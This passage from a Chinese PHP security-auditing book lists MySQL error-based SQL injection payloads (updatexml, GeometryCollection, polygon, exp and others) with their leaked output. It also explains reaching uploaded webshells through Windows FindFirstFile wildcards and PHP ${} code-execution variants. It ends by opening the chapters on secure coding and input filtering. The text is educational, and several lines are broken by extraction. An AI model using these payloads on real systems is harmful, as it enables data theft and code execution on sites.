0x5c
，
（
select user
（）））））
错误信息如图8-11所示。
第三种：updatexml（）
注入语句：
id = 1 AND
（
updatexml
（
1
，
concat
（
0x5e24
，（
select user
（）），
0x5e24
），
1
））
图 8-11
错误信息：
[Err] 1105 - XPATH syntax error
：
'^$root@localhost^$'
第四种：GeometryCollection（）
注入语句：
id = 1 AND GeometryCollection
（（
select * from
（
select * from
（
select user
（））
a
）
b
））
错误信息：
[Err] 1367 - Illegal non geometric '
（
select `b`.`user
（）
` from
（
select 'root@localhost' AS `user
（）
` from dual
）
`b`
）
' value found during parsing
第五种：polygon（）
注入语句：
id = 1 AND polygon
（（
select * from
（
select * from
（
select user
（））
a
）
b
））
错误信息：
[Err] 1367 - Illegal non geometric '
（
select `b`.`user
（）
` from
（
select 'root@localhost' AS `user
（）
` from dual
）
`b`
）
' value found during parsing
第六种：multipoint（）
注入语句：
id = 1 AND multipoint
（（
select * from
（
select * from
（
select user
（））
a
）
b
））
错误信息：
[Err] 1367 - Illegal non geometric '
（
select `b`.`user
（）
` from
（
select 'root@localhost' AS `user
（）
` from dual
）
`b`
）
' value found during parsing
第七种：multilinestring（）
注入语句：
id = 1 AND multilinestring
（（
select * from
（
select * from
（
select user
（））
a
）
b
））
错误信息：
[Err] 1367 - Illegal non geometric '
（
select `b`.`user
（）
` from
（
select 'root@localhost' AS `user
（）
` from dual
）
`b`
）
' value found during parsing
第八种：multipolygon（）
注入语句：
id = 1 AND multipolygon
（（
select * from
（
select * from
（
select user
（））
a
）
b
））
错误信息：
[Err] 1367 - Illegal non geometric '
（
select `b`.`user
（）
` from
（
select 'root@localhost' AS `user
（）
` from dual
）
`b`
）
' value found during parsing
第九种：linestring（）
注入语句：
id = 1 AND LINESTRING
（（
select * from
（
select * from
（
select user
（））
a
）
b
））
错误信息：
[Err] 1367 - Illegal non geometric '
（
select `b`.`user
（）
` from
（
select 'root@localhost' AS `user
（）
` from dual
）
`b`
）
' value found during parsing
第十种：exp（）
注入语句：
id = 1 and EXP
（
~
（
SELECT*from
（
SELECT user
（））
a
））
错误信息：
[Err] 1690 - DOUBLE value is out of range in 'exp
（
~
（（
select 'root@localhost' from dual
）））
'
8.8 Windows FindFirstFile利用
目前大多数程序都会对上传的文件名加入时间戳等字符再进行MD5，然后下载文件的时候通过保存在数据库里的文件ID读取出文件路径，一样也实现了文件下载，这样我们就无法直接得到我们上传的webshell文件路径，但是当在Windows下时，我们只需要知道文件所在目录，然后利用Windows的特性就可以访问到文件，这是因为Windows在搜索文件的时候使用到了FindFirstFile这一个winapi函数，该函数到一个文件夹（包括子文件夹）去搜索指定文件。
利用方法很简单，我们只要将文件名不可知部分之后的字符用“”代替即可，不过要注意的一点是，只使用一个“”则只能代表一个字符，如果文件名是12345或者更长，这时候请求“1”都是访问不到文件的，需要“1、
在这段代码中，我们并没有直接定义$seay变量，但是我们来看看最终的输出$seay的结果是多少，如图8-13所示。
图 8-13
从截图中可以看到，输出变量$seay的值为“123”，这个123是在$$a赋值的，这时候$a被赋值了"seay"，而$$a就相当于$'seay'。
部分PHP应用在写配置文件或者使用preg_replace（）函数第二个参数赋值变量时，会用到双引号（"）来代表string类型给变量赋值，在PHP语言中，单引号和双引号是有区别的，单引号代表纯字符串，而双引号则是会解析中间的变量，所以当使用双引号时会存在代码执行漏洞，我们来看一个测试，代码如下：
当运行这段代码时，phpinfo（）函数会成功执行，输出内容如图8-14所示。
图 8-14
这里有一个地方需要注意，代码${@phpinfo（）}中的“@”符号是必须存在的，不然就无法执行，但是除了“@”符号还有其他的写法也一样可以，只要不影响PHP规范均可执行，举例如下：
1）花括号内第一个字符为空格：
$a = "${ phpinfo
（）
}"
；
2）花括号内第一个字符为TAB：
$a = "${      phpinfo
（）
}"
；
3）花括号内第一个字符为注释符：
$a = "${/**/phpinfo
（）
}"
；
4）花括号内第一个字符为回车换行符：
$a = "${
phpinfo
（）
}"
；
5）花括号内第一个字符为加号（+）：
$a = "${+phpinfo
（）
}"
；
6）花括号内第一个字符为减号（-）：
$a = "${-phpinfo
（）
}"
；
7）花括号内第一个字符为感叹号（！）：
$a = "${
！
phpinfo
（）
}"
；
除了这些之外还有一些如~、\等。
第三部分 PHP安全编程规范
这一部分主要介绍PHP安全编程的规范，从攻击者的角度来告诉你应该怎么做才能写出更安全的代码，这也是本书期望达到的目标：让代码没有漏洞。这部分包括第9、10、11章，第9章主要介绍参数的安全过滤，所有的攻击都需要有输入，所以我们要阻止攻击，第一件要做的事情就是对输入的参数进行过滤，该章详细分析discuz的过滤类，用实例说明什么样的过滤更有效果。
第10章主要介绍PHP中常用的加密算法，目前99%以上的知名网站都被拖过库，泄露了大量的用户数据，而在这一章，我们将详细说明使用什么样的加密算法能够帮助你增强数据的安全性。
第11章是安全编程比较核心的一章，所有应用都是一个个功能堆砌起来的，我们在这章从攻击者的角度详细分析常见功能会出现哪些安全问题，在分析出这些安全问题的利用方式后，再给出问题的解决方案，如果你是应用架构师，这些能够帮助你在设计程序功能时避免这些安全问题。
第9章 参数的安全过滤
所有对Web应用的攻击都要传入有害的参数，因此代码安全的基础就是对传入的参数进行有效的过滤，比如像SQL注入漏洞，只要过滤到单引号，就能防御住大部分的string类型的SQL注入，只要过滤掉尖括号和单双引号也能过滤掉不少XSS漏洞，这种简单的过滤跟完全不过滤带来的效果是天壤之别，我们做的就是要细化这些过滤规则，通过横向扩展防御策略来拦截更多的攻击，不少第三方提供了这样的过滤函数和类，我们可以直接引用，另外PHP自身提供了不少过滤的函数，好好使用这些内置的函数也能达到非常好的效果。
9.1 第三方过滤函数与类
在一些中小型的Web应用程序中，由于大多数开发者是不怎么懂安全的，所以都会选择一些第三方的过滤函数或者类，直接拿过去套着用，并不知道效果到底怎么样。在PHP安全过滤的类里面，比较出名的有出自80sec团队给出的一个SQL注入过滤的类，在国内大大小小的程序像discuz、dedecms、phpmywind等都使用过。
目前大多数应用都有一个参数过滤的统一入口，类似于dedecms的代码，如下所示：
foreach
（
Array
（
'_GET'
，
'_POST'
，
'_COOKIE'
）
as $_request
）
    {
    foreach
（
$$_request as $_k => $_v
）
    {
         if
（
$_k == 'nvarname'
）
${$_k} = $_v
；
         else ${$_k} = _RunMagicQuotes
（
$_v
）；
    }
}
跟进_RunMagicQuotes（）函数之后的代码如下：
function _RunMagicQuotes
（
&$svar
）
{
   if
（！
get_magic_quotes_gpc
（））
   {
        if
（
is_array
（
$svar
）